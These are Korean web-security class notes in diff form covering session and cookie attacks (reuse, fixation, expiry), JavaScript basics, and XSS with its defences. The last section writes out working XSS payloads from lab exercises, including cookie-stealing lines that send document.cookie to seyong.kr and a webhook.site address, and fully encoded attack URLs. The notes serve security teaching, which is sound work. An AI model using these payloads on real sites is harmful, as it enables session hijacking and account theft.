@@ -1,0 +1,569 @@
+5일차
+
+세션/쿠키 &lt;- 작동원리 
+       response
+       set-cookie:&lt;-  너를 위한 공간 서버에 만들어서 그 이름 붙인걸 
+
+requests 
+cookie:세션id=값 &lt;- 세션 X
+내 PC 하드디스크에 저장되어 있는 
+서버의 세션을 식별하기 위한 값을 쿠키로 저장한 값
+
+같은 외부IP를 사용하는 경우 서버 전혀 알수 없다
+src ip -&gt; 공유기 wifi 
+
+
+1. 세션 재사용
+ 남의 세션을 갖다 썼더니 그사람으로 로그인이 되네?
+ -&gt; 세션 ip를 가지고 밖에 식별 
+ -&gt; 금융권 -&gt; 솔루션 
+    get_remote_host() -&gt; ip 
+  
+
+    로그인 할때 세션    aaaa
+                    [
+                        loginid: test01
+                        ip: 213.23.214.23
+                    ]
+    모든 기능을 사용할때마다
+     
+     if get_remote_host() == 세션["ip"]:
+        니꺼아니지?
+     else:
+        기능 실행 
+
+2. 세션 고정 
+   로그인 전 발급한 session id 와 로그인 후 저장된 session id가 동일 
+
+   A naver.com -&gt;                  -&gt;              naver.com   
+   cookie:sessid=cccc                                  set-cookie:sessid=bbbb [loginid: 비로그인 ]
+
+     naver.com 
+     [sessid=bbbb]
+
+     naver.com/login ?id=test&amp;pw=1234                       bbbb[loginid:test 이름:홍길동]
+
+  해커  naver.com -&gt; 
+  cookie:sesssid=cccc                                              naver.com  cccc [loginId:test        ]
+F5 새로고침
+
+&lt;링크&gt;naver.com들어 갈때 cookie:sessid=cccc가지고 접속해&lt;/링크&gt;
+-&gt; 네이버에서 행사합니다. 빨리 신청하세요.
+  
+  세션 주입 공격 -&gt; 세션 탈취X 
+
+  로그인 시킬때 1줄 
+
+  /login
+
+  result = select pw from member whre id='입력'
+   /logout -&gt; naver.com/
+    session.invalidate();       
+    쿠키:sessid=aaaa      -&gt;          bbbb [   ]
+
+   if pw == result:
+      session.invalidate();  -&gt; 삭제 -&gt; aaaa [ ] -&gt; 로그아웃 
+      자동로그인
+
+       -&gt; 기존에 니가 들고들어온 ccc공간 삭제해버리고 새로운공간 dddd 만들어서
+                            set-cookie:sessid=dddd 
+      세션["loginId"] = id;
+
+      비로그인상태 burp cookie : aaaa 
+      로그인    burp cookie: bbbb 양호
+     
+
+mail.naver.com 
+  
+  if 세션["loginId"] == "비로그인":
+      로그인이 필요합니다.~
+  else:
+     select * from mail from where id = 세션["loginid"]
+
+
+3. 세션 만료 
+   회사 내규 
+   기능의 중요성 
+  chatgpt 
+      aaaa [ loginId: test ] &lt;- 만료시간 15분 -&gt; 로그아웃이되어잇네?
+    로그인을 연장시려면 클릭하서
+
+한달동안 무인도-&gt; 집와 chatgpt 아직로 로그인이 되어있는 
+cookie:내하드 -&gt;    s서버 aaa [ ]
+   session timeout -&gt; 시간을 얼마동안 유지하고 지나면 삭제 
+  
+유추가능한 인증정보 &lt;-
+C언어로 웹서버를 짜던시절-&gt; 랜덤 
+  
+  기본 1시간  -&gt;  한달 -&gt; 31 -&gt; 접속 
+  naver.com cookie:nid=asdf;nabv-asdfnsdafsadf
+  -&gt; 
+  밥먹고왔어 -&gt; naver.com -&gt;
+
+sessid=000000000001
+sessid=000000000002 &lt;-
+
+해커
+sessid=000000000006
+
+인증정보-&gt; 계정비밀번호, 공동인증서비밀번호, 핀번호, SMS문자인증번호, OTP인증번호 + 세션ID쿠키값
+
+웹 프론트 엔드 - 분석 -&gt; 코드 
+
+
+쇼핑몰 -&gt; 로그인안했는데 
+장바구니 유지 -&gt;
+
+cookie:bag=1,10,61,20,&lt;-
+          
+aaaa [   id: 비로그인,   장바구니: 커피1박스, 휴지1롤, .....]
+네이버웹툰 
+로그인안하고 -&gt;  
+
+쿠키 &lt;-
+local storage 
+session storage 
+
+==========================================
+* 세션/쿠키 문제 2번                   ~ 40분 
+==========================================
+1. 풀이과정
+2. 정답
+
+- Hint: 생긴거 보면 어떤 인코딩이 되어있다?
+==========================================
+쿠키 변조 &lt;- 
+공격자 쿠키변조 파라미터 &lt;-
+
+%00%00%00
+&amp;#00;^ -
+qwefwef/+lfkjw/ base64
+
+cookie:user=tes02;role=user 
+
+main?user=test02&amp;role=user &lt;-
+
+http://lab.eqst.co.kr:8156/
+
+
+============================================
+
+Front-end -&gt; 서버 -&gt; 코드 전체를 -&gt; 응답 -&gt; 브라우저에서 실행
+back-end -&gt; 서버 -&gt; 코드 전체가 서버 -&gt; 사용자가 모르게 처리 -&gt; 응답 
+
+============================================
+-HTML
+ 틀, 껍데기 
+
+&lt;태그&gt;문자열&lt;/태그&gt;
+&lt;태그/&gt;
+
+&lt;태그 속성="값" 속성="값" 속성="값" 이벤트핸들러=""&gt;ㅁㄴㅇ&lt;/태그&gt;
+
+
+- CSS 
+디자인
+
+selector &lt; 선택자  {
+    속성: 값;
+    색깔: 빨간색:    
+}
+
+-Javascript &lt;- 
+동적으로 페이지를 만들어주는 역할
+
+0. 문법
+      ; &lt;- 하나의 명령
+{ }
+
+1. 선언 
+var a = 1;var a = 'a';var a = "a";
+
+def 함수명(인자):
+___
+
+function 함수명(인자) {     할거 ;      return 변수;}
+
+var 함수명 = function(인자) {
+
+}
+
+var a = '홍길동"s 아이폰';
+
+2. 입출력
+print() -&gt; console.log -&gt; 개발자도구 콘솔탭 
+출력 alert()
+input()
+입력 prompt()
+var ascii=prompt("아스키 입력하거라")
+asci = input("아스키: ")
+참/거짓 
+var tf = confirm("글진짜 삭제할꺼에요?");
+
+3. 조건
+
+if 조건:
+  참일때 
+else:
+  거짓일때
+
+
+if(조건){  
+    참일때;
+} else {
+     거짓일때;
+}
+
+
+4. 반복
+
+for 변수 in range, 배열, 객체, json:
+__ 할거
+
+for(var i = 0; i&lt;10; i++) {
+    할거
+}
+
+5. 요소 제어 GUI 
+  요소를 가져와서 함수, 속성 
+
+  var specialboy = document.getElementBy? 
+  var sb = document.getElementById("test");
+  sb.click= function() {
+    document.getElementsByClass("class1")[0]
+    .innerHtml = "style color:yellow"
+  }
+
+ document &lt;- 현제 페이지 문서 전체 
+ element &lt;- html 문서를 브라우저가 해석해서 각각의 객채로 만들어 놓은것 '요소'
+ getElementById -&gt; 단일
+ getElementsByClass -&gt; 배열[0]
+ getElementsByName -&gt; 배열 [0]
+
+
+
+
+===========================
+
+* CSS 
+1. 속성으로 지정 
+   &lt;태그 style="값"&gt;
+2. 별도 태그로 묶어서 
+   &lt;style&gt;
+    이문서 전체에 대한 디자인
+   &lt;/style&gt;
+
+3. 별도 파일로 불러서 
+
+=========================
+
+javascript -&gt; 요소 제어 
+공격구문
+
+* Javascript 
+1. 이벤트핸들러 
+ &lt;태그 이벤트핸들러="자바스크립트"&gt;
+2. 별도 태그로 묶어서 
+  &lt;script&gt;
+    자바스크립트 코드 
+  &lt;/script&gt;
+3. 외부파일 불러오기 
+  &lt;script src="test.js"&gt;&lt;/script&gt;
+
+
+
+&lt;태그 id="test" class="1반" 속성="값" 속성2="값" 이벤트="이거해"&gt;
+
+&lt;태그 class="1반"&gt;
+
+&lt;태그 class="1반"&gt;
+id: 문서전체에서 유일하게 딱 하나 지정할수 있는 특별한 이름 
+class: 얘로 그룹명을 지어주는건데 여러개 지정할 수 있고 이걸로 가져오면 배열
+
+&lt;script&gt;
+
+&lt;/script&gt;
+
+===================================
+
+* XSS -&gt; Cross-site Script 
+내가 입력한게 javascript 로 실행 
+
+공격 시나리오
+1. 피싱사이트로 이동
+   해당 주소로 이동 
+   window.location.href = "https://naver.com";
+
+   네이버카페 
+   cafe.naver.com/asdfklj/asdfkljef"fa.ewjawefkjlkweafjlkajfklajwelklwkwf
+
+   nid.never.com/nidlogin.login 
+   로그인 
+   아이디 비번 -&gt; 
+   insert 딴애들계정(id,pw) values(id, pw );
+   -&gt; 진짜로 네이버로 또 이동을 시켜서 로그인
+
+  URL Shortener 
+  스팸문자 
+  bit.ly/wflkj 
+  goo.gl/afkj 
+
+
+2. 키로깅 
+
+ 로그인 
+ 아이디 [      ]
+ 비번   [      ]
+            [로그인]
+
+악성코드-&gt; 아이디랑 비밀번호에 입력한 값을 꺼내와서
+      해커한테 전달하고 나서 로그인시켜 
+
+3. 웹기반 채굴기 
+javascript로 채굴 코드 -&gt; 해커 지갑으로 전송해
+
+hacker.com -&gt; 링크
+
+4. 세션ID 쿠키값 탈취 &lt;-
+hacker.com 
+지금 접속한애 쿠키값꺼내가지고 해커한테 보내 
+
+naver.com/?dsflkafkjlweklfj
+[
+    nid=adsf;smb=asdf
+]
+
+hakcer.com 
+[
+    id=aaaa 
+]
+
+
+
+파라미터=값&amp;파라미터=62
+1. Reflected XSS - 반사형 
+  사용자 입력값&lt;-
+  내가 입력한 값이 요청을 보내자마자 응답에서 바로 노출이 될 때 &lt;-
+  search?keyword=&lt;공격구문&gt;
+req -&gt;   res 
+
+        test&lt;- 문자열 
+  Repeater -&gt; 값 -&gt; send -&gt; 응답  
+  
+  링크: test.com/sdaf?keyword=ㅁ이ㅏㅓ리ㅏㄴㅇ머리ㅏㅇㄴ마리ㅓㄴㅁ어공격구문-&gt;
+  수배겸
+  링크: hacker.com/ -&gt;  악성사이트 링크 
+
+2. Stored XSS - 높음 
+  내가 입력한게 요청을 보내면 -&gt; 서버에 저장 
+  조회를 할떄 공격코드                &lt;- 서버에서 꺼내와서 보여줄떄 &lt;- 실행
+
+ 게시판에 글하나 써놓고 기다려요
+ 누군가 누를때까지
+   게시판 글 &lt;-
+
+
+=======================================
+* 대응방안 
+1. HTML Entity로 치환 / HTML Encoding 
+  브라우저가 해설 
+  명령어로 인식X 문자열로 인식
+
+2. 사용자 입력값 검증 
+ 1) Whitelist 
+   특수문자 아무것안돼 
+   몇개는 허용해줄게
+
+ 2) BlackList/blocklist  
+   일단 다돼 
+   공격에 쓸만한 &lt;script&gt; 안돼
+  script&lt;- 지워버려 
+  &lt;script&gt; -&gt; &lt;&gt;
+  &lt;ScRIPT&gt;-&gt; &lt;SCrIPT&gt; &lt;-태그 대소문자X
+  javascript 
+  &lt;script&gt; 
+
+  
+
+
+
+==================================
+
+요청-&gt;응답 타입 
+
+test.com/search?name=
+
+1.&lt;태그&gt; __입력값__  &lt;/태그&gt;
+&lt;태그&gt; &lt;script&gt;악성코드&lt;/script&gt; &lt;/태그&gt;
+&lt;태그 이벤트핸드러=악성코드&gt;
+
+2. &lt;태그 속성='__입력값__'&gt;
+  '&lt;&gt;;()-&gt; ' &amp;lt;&amp;gt; ()
+  
+
+&lt;input type="hidden" name="param" value="멍멍이"/&gt;   악성코드    &lt;qwer qwer=" 
+"&gt;
+
+멍멍이"/&gt;   악성코드    &lt;qwer qwer="
+  
+
+
+3. 이미 스크립트 안에 
+&lt;script&gt;
+ var a = 'abc';
+ var b = 'qwer';
+
+ window.location. = "https:.sfa'" + "1";
+  악성코듬ㅇ나리ㅓ마ㅣ얼;
+  미ㅏ얾ㅇㄴ;
+  var a =""; 
+
+ asdf;
+ asdf;
+ 
+&lt;/script&gt;
+
+
+xss cheat sheet
+어떤태그 어떤이벤트핸들러로 자바스크
+
+
+* XSS 공격 방법 
+1. 파라미터를 내가 넣어요
+2. send response 
+3. 응답안에 문자열로 어디에 보이는지 
+4. 이런 특수문자가 필요해 -&gt; 치환 
+  &lt;&gt;()"'; 
+5. 공격구문을 넣어 -&gt; 없어졌어 
+  필터링 유추 &lt;&gt;
+
+
+
+
+&lt;textarea class="form-control" readonly="" style="height: 350px;"&gt;   qwe&lt;script&gt;alert('xss');&lt;/script&gt;  &lt;/textarea&gt;
+
+qwe&lt;script&gt;alert('xss');&lt;/script&gt;
+
+&lt;&gt;()';/
+
+"   
+&lt;태그 이벤트핸들러='악성코드'/&gt; 
+&lt;&gt;();'"/
+
+&lt;input type="hidden" id="pageIndex" name="pageIndex" value="xsstest"/&gt;
+&lt;script&gt;
+    alert('XSS');
+&lt;/script&gt;
+ &lt;aaaa aaaa="" /&gt;
+
+pageIndex=xsstest"/&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;&lt;aaaa aaaa="
+
+
+https://lab.eqst.co.kr:8083/exam16/noticelist.php?pageIndex=xsstest"/&gt;&lt;script&gt;공격구문&lt;/script&gt;&lt;aaaa+aaaa%3d"&amp;sorting=BOARD_ID&amp;sortingAd=DESC&amp;startDt=&amp;endDt=&amp;searchType=all&amp;keyword=abc
+
+bit.ly/  
+
+자바스크립트 난독화 
+
+jsf*ck
+
+=========================================
+* XSS 문제 2번    -&gt; 40분에 풀이
+=========================================
+1. 풀이과정 
+2. 공격가능한 URL 
+  버프 문법 완성 후 copy url -&gt; 내가 주소창에 복붙 -&gt; 바로 실행 확인하고나서
+  여기에 붙여넣기 
+3. 정답 
+
+Hint 1: 집착하지 마라~ 1번문제 목록 
+Hint 2: 사용자 입력값이 어디에 노출 &lt;- 
+    &lt;태그&gt;ㅁㅇㄴㄹ &lt;/태그&gt;
+    &lt;태그 속성="ㅁㄴㅇㄹ"/&gt;
+    &lt;script&gt; 
+        ㅁㄴㅇㄹ
+    &lt;/script&gt;
+Hint 3: 함수선언부까지도 탈출을 해야함 
+
+def test():
+    print("test!")
+print("abc")
+
+-&gt; 아무것도안나와요
+abc
+
+=========================================
+
+
+
+#################################
+          명예의 전당
+#################################
+     [       이유준       ]          
+     [       이동은       ]          
+     [       오준석       ]          
+     [       박종원       ]          
+     [       김민형       ]          
+     [       이지후       ]          
+     [       박진영       ]          
+     [       손성민       ]          
+     [       오준서       ]          
+     [이재홍, 백상준, 김수민]
+#################################     
+
+http://192.168.72.40:5000 
+
+
+&lt;script&gt;
+  &lt;/script&gt;
+&lt;script&gt;
+    function fnEdit(_board_id){
+        document.location.href = 'noticeedit.php?board_id=' + 1; 
+    }
+    alert('xss'); 
+    function pppp()  { 
+        var p=0;
+    }
+
+&lt;/script&gt;
+
+공격구문 : 1;}alert('xss');function pppp()  {var p=0
+
+
+쿠키 탈취 세션ID
+
+location.href = "https://seyong.kr/?cookie="+document.cookie ;
+
+공격구문 : 1;}location.href = "https://webhook.site/c51a9124-b38a-4150-a7dc-9c9d126cea13/?cookie=" + document.cookie;function pppp()  {var p=0
+
+
+https://lab.eqst.co.kr:8083/exam17/noticeview.php?board_id=1%3b}location.href+%3d+"https%3a//seyong.kr/%3fcookie%3d"%2bdocument.cookie+%3bfunction+pppp()++{var+p%3d0&amp;pageIndex=xt2&amp;sorting=xt3&amp;sortingAd=xt4&amp;startDt=xt5&amp;endDt=xt6&amp;searchType=xt7&amp;keyword=xt8
+
+
+location.href = "https://webhook.site/c51a9124-b38a-4150-a7dc-9c9d126cea13/?cookie=" + document.cookie;
+
+
+무료 OOB test 
+interactsh 
+webhook
+
+https://lab.eqst.co.kr:8083/exam17/noticeview.php?board_id=1%3b}location.href+%3d+"https%3a//webhook.site/c51a9124-b38a-4150-a7dc-9c9d126cea13/%3fcookie%3d"+%2b+document.cookie%3bfunction+pppp()++{var+p%3d0&amp;pageIndex=xt2&amp;sorting=xt3&amp;sortingAd=xt4&amp;startDt=xt5&amp;endDt=xt6&amp;searchType=xt7&amp;keyword=xt8
+
+리다이렉션 해주세요 X 
+백엔드에서 몰래 티안나게 해커서버로 쿠키값 보내줘~ 
+javascript 
+
+AJAX 
+
+-&gt; 
+python  requests &lt;-
+
+XMLHttpRequest 
+
+
+
+fetch("https://seyong.kr/?asdf="+document.cookie);
+
+&lt;/script&gt;&lt;script&gt; &amp;lt;&amp;gt;&lt;
+
+"Y" 와 "N" or 'N'이 "Y"와 같거나</code></pre><div class="info">© 2025 Seyong Kim. All Rights Reserved.</div></div></body></html>
